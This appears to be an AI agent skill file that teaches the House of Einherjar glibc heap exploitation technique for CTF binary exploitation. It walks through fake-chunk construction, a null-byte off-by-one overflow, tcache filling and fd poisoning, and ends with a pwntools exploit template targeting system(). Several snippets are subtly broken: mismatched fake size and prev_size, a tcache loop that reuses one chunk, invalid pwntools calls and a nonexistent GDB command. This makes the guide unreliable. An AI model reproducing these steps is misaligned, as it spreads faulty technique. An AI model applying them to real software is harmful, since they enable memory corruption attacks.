---
name: house-of-einherjar
description: How to perform House of Einherjar heap exploitation to allocate memory at arbitrary addresses. Use this skill whenever the user mentions heap exploitation, glibc heap attacks, arbitrary memory allocation, off-by-one overflow exploitation, tcache poisoning, fast bin attacks, or any CTF challenge involving heap manipulation. This is essential for binary exploitation tasks where you need to control malloc() return addresses.
---

# House of Einherjar Exploitation

A heap exploitation technique that allows allocating memory at almost any specific address by manipulating glibc's malloc allocator.

## When to Use This

Use this technique when you have:
- An **off-by-one overflow** (specifically with null byte) from one chunk to the next
- A **heap leak** to discover chunk addresses
- Need to **allocate at an arbitrary address** (e.g., to overwrite function pointers, GOT entries, or achieve arbitrary write)

## Core Concept

The attack creates a **fake chunk** that tricks malloc into thinking it's a valid free chunk, then uses consolidation to merge it with a real chunk, creating an overlapping chunk situation that enables arbitrary allocation.

## Prerequisites

1. **Off-by-one overflow** with null byte capability
2. **Heap leak** to discover chunk addresses (required for fake chunk construction)
3. **glibc 2.30+** with tcache enabled (or 2.26-2.29 with fastbin)

## Attack Setup

### Chunk Layout

```
┌─────────────────────────────────────────────────────────────┐
│ Chunk A (fake) - controlled by attacker                     │
│   fd → points to itself (bypass sanity checks)              │
│   bk → points to itself                                     │
│   size → matches prev_size of Chunk B                       │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│ Chunk B - overflow target                                   │
│   [overflowable data]                                       │
│   size → normal size                                        │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│ Chunk C - consolidation target                              │
│   [normal data]                                             │
│   size → normal size                                        │
└─────────────────────────────────────────────────────────────┘
```

### Step-by-Step Attack

#### Phase 1: Create Fake Chunk

1. **Allocate Chunk A** (attacker-controlled)
2. **Write fake chunk metadata** inside Chunk A:
   - `fd` pointer → points to Chunk A itself
   - `bk` pointer → points to Chunk A itself
   - `size` → will be set in Phase 2

```python
# Example: Create fake chunk in Chunk A
fake_chunk_addr = chunk_a_addr + offset_to_fake_metadata
fake_chunk = p64(fake_chunk_addr)  # fd
fake_chunk += p64(fake_chunk_addr)  # bk
fake_chunk += p64(fake_size)        # size (will match prev_size)
```

#### Phase 2: Prepare Consolidation

1. **Allocate Chunks B and C** after Chunk A
2. **Trigger off-by-one overflow** in Chunk B:
   - Overwrite the null byte at end of Chunk B
   - This clears the `PREV_INUSE` bit in Chunk C's header
   - Overwrite `prev_size` with: `chunk_c_addr - fake_chunk_addr`

```python
# Calculate prev_size for off-by-one
prev_size = chunk_c_addr - fake_chunk_addr

# Overflow Chunk B to set prev_size
overflow_data = b'A' * (chunk_b_size - 1)  # Fill to null byte
overflow_data += p64(prev_size)            # Overwrite prev_size
overflow_data += b'\x00'                   # The null byte overflow
```

**Critical**: The `prev_size` written here must match the `size` field in the fake chunk A.

#### Phase 3: Fill Tcache

1. **Fill tcache** by allocating and freeing chunks (typically 7 times for tcache limit)
2. This ensures Chunk C goes to unsorted bin when freed, not tcache

```python
# Fill tcache (7 iterations for glibc 2.30+)
for i in range(7):
    alloc_chunk()
    free_chunk()
```

#### Phase 4: Trigger Consolidation

1. **Free Chunk C**
2. malloc will consolidate Chunk C with the fake Chunk A (because PREV_INUSE is cleared)
3. This creates a merged chunk starting at fake Chunk A's address

```python
free(chunk_c)
# Now fake_chunk + chunk_c are merged
```

#### Phase 5: Create Overlapping Chunk

1. **Allocate Chunk D** - this will start at fake Chunk A's address and cover Chunk B
2. Chunk D now overlaps with Chunk B, giving you control over Chunk B's metadata

```python
chunk_d = malloc(fake_chunk_size + chunk_c_size)
# chunk_d starts at fake_chunk_addr and covers chunk_b
```

#### Phase 6: Arbitrary Allocation (Optional Extension)

Now you can extend this with **fast bin attack** or **tcache poisoning**:

1. **Free Chunk B** (now controlled via Chunk D overlap)
2. **Overwrite Chunk B's fd pointer** to point to target address
3. **Allocate twice** - second allocation returns target address

```python
# Overwrite fd pointer via Chunk D overlap
chunk_d[fd_offset] = p64(target_address)

free(chunk_b)  # Goes to fastbin/tcache with poisoned fd

malloc()       # Dummy allocation
chunk_at_target = malloc()  # Returns target_address!
```

## Common Pitfalls

| Issue | Solution |
|-------|----------|
| `prev_size` doesn't match fake chunk size | Ensure both are identical |
| Tcache not filled | Free 7 chunks before freeing Chunk C |
| Alignment issues | Ensure fake chunk address is 16-byte aligned |
| Size sanity checks fail | Fake chunk size must be valid (aligned, not too small) |
| Heap leak not available | Find alternative leak (unsorted bin, double free, etc.) |

## Example Exploit Template

```python
from pwn import *

# Setup
context.arch = 'amd64'
context.os = 'linux'

# Get heap leak (required)
heap_addr = get_heap_leak()

# Calculate addresses
chunk_a = heap_addr + 0x20
chunk_b = chunk_a + 0x30
chunk_c = chunk_b + 0x30
fake_chunk = chunk_a + 0x10  # Inside chunk A

# Phase 1: Create fake chunk
sendline(b'A' * 0x10 + p64(fake_chunk) + p64(fake_chunk) + p64(0x20))

# Phase 2: Off-by-one overflow
prev_size = chunk_c - fake_chunk
sendline(b'B' * 0x2f + p64(prev_size) + b'\x00')

# Phase 3: Fill tcache
for _ in range(7):
    sendline(b'X' * 0x20)
    sendline(b'free')

# Phase 4: Free C to consolidate
sendline(b'C' * 0x20)
sendline(b'free')

# Phase 5: Allocate D (overlapping)
chunk_d = sendline(b'D' * 0x50)

# Phase 6: Poison and allocate at target
target = libc.sym['system'].address
chunk_d[0x10] = p64(target)  # Overwrite fd
sendline(b'free')
sendline(b'alloc')  # dummy
shell = sendline(b'alloc')  # at target!
```

## References

- [how2heap - House of Einherjar](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_einherjar.c)
- [GuyInATuxedo - House of Einherjar](https://guyinatuxedo.github.io/42-house_of_einherjar/house_einherjar_exp/)
- [CTF Wiki - House of Einherjar](https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/house_of_einherjar/)

## Related Techniques

- **House of Force** - Overwrite top chunk for arbitrary allocation
- **Unsorted Bin Attack** - Similar consolidation technique
- **Tcache Poisoning** - Poison tcache fd pointers
- **Fastbin Attack** - Poison fastbin fd pointers

## Debugging Tips

1. **Use GDB with heap visualization**:
   ```bash
   gdb ./binary
   (gdb) heap analyze
   (gdb) x/20gx 0x[chunk_address]
   ```

2. **Check chunk metadata**:
   - `size & 0x1` = PREV_INUSE flag
   - `size & 0x2` = IS_MMAPPED flag  
   - `size & 0x4` = NON_MAIN_ARENA flag

3. **Verify consolidation**:
   - After freeing Chunk C, check if fake chunk was merged
   - Look for enlarged chunk size in heap dump
